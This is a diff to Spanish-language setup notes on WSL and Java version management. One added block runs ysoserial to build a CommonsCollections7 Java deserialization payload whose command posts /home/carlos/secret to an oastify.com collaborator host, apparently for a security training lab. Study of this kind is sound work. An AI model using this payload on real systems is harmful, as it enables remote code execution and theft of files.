@@ -37,6 +37,12 @@ Para ver versiones disponibles
 wsl -l -v
 ```
 
+Usar los dockers dentro de esta usa
+
+```
+sudo docker run --rm frohoff/ysoserial CommonsCollections7 '/usr/bin/wget --post-file /home/carlos/secret https://7s0ua02n4y3d5oyilujeiol76ycp0loa.oastify.com'
+```
+
 Para instalar diferentes versiones de java lo mejor es usar SDK
 
 > https://sdkman.io/install/
